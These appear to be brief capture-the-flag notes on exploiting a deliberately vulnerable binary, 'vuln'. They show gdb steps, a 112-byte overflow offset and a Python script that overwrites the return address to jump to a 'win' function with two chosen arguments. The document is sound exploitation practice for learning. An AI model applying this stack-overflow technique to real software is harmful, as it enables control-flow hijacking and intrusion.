- run the program with gdb
	gdb ./vuln

- ran the program:
	(gdb) run

- inputted several strings to overflow buffer
- found out that 112 characters are the ideal

- wrote python script to print 112 "A" and provide arguments
		#!/usr/bin/python
		# -*- coding: utf-8 -*-

		import sys
		import socket
		from struct import *

		offset = "A" * 112
		# win function address is 0x08049296
		# converting the address to little endian with struct.pack
		eip = pack('<I', 0x08049296)

		# arg1 in hex is 0xCAFEF00D
		# converting the address to little endian with struct.pack
		arg1 = pack('<I', 0xCAFEF00D)

		# arg2 in hex is 0xF00DF00D
		# converting the address to little endian with struct.pack
		arg2 = pack('<I', 0xF00DF00D)

		mytext = offset+eip

		print (mytext+'CCCC'+arg1+arg2)
